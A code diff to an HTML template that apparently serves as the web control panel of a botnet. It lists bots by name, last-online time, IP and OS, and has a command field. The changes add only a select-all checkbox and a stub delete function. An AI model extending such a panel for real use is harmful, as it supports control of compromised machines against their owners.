@@ -5,7 +5,14 @@
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
 
     <link rel="stylesheet" type="text/css" href="../static/css/stylesheet.css" media="screen">
-    <link rel="stylesheet" type="text/css" href="../static/css/github-dark.css" media="screen">
+    <script language="JavaScript">
+    function toggle(source) {
+      var checkboxes = document.getElementsByName('botcheckbox');
+      for(var i=0, n=checkboxes.length;i<n;i++) {
+        checkboxes[i].checked = source.checked;
+      }
+    }
+    </script>
     <title>Bot list</title>
   </head>
 
@@ -28,6 +35,7 @@
 
           <table>
           <tr><th>Name</th><th>Last Online</th><th>IP</th><th>OS</th><th>Sel.</th></tr>
+	  <input type="checkbox" onClick="toggle(this)" /> Toggle All<br/>
           {{bot_table}}
           </table>
       </section>
@@ -51,6 +59,10 @@
         });
         $('#cmd').val('');
         return false;
+    }
+    function deleteBot(botid) {
+       // Todo: delete botid
+       alert(botid);
     }
     </script>
   </body>
